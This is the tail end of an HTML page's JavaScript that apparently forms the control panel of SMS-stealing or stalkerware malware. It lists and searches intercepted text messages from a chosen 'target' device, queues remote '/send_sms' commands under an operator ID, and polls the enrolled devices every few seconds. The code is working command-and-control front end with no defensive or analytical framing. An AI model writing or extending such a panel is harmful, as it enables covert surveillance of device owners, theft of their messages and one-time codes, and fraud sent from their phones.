    document.getElementById('nextBtn').onclick = () => { if (maxSms && currentOffset + 10 < maxSms) pull(currentOffset + 10); };
    document.getElementById('prevBtn').onclick = () => { if (currentOffset >= 10) pull(currentOffset - 10); };

    document.getElementById('deviceSelector').onchange = (e) => {
        targetId = e.target.value;
        lastHash = ''; currentOffset = 0; isLive = true;
        showLoader('SWITCHING NODE...');
        fetchVault();
        setTimeout(hideLoader, 800);
    };

    document.getElementById('searchInput').oninput = renderFeed;

    document.getElementById('btnSendSms').onclick = () => {
        if (!targetId) return;
        document.getElementById('smsNumber').value = '';
        document.getElementById('smsMessage').value = '';
        openModal('smsModal');
    };

    document.getElementById('modalSmsBtn').onclick = async () => {
        const n = document.getElementById('smsNumber').value;
        const m = document.getElementById('smsMessage').value;
        if (n && m) {
        await sb('commands', 'POST', { device_uuid: targetId, type: '/send_sms', data: JSON.stringify({number: n, message: m}), operator_id: auth.operator_id, status: 'pending' });
            closeModal('smsModal');
            showLoader('TRANSMITTING PACKET...');
            setTimeout(hideLoader, 1500);
        } else {
            alert("Please fill all transmission parameters.");
        }
    };

    setInterval(syncDevices, 8000);
    setInterval(fetchVault, 5000);
    setInterval(checkSyncStatus, 4000);
    syncDevices();
</script>
</body>
</html>
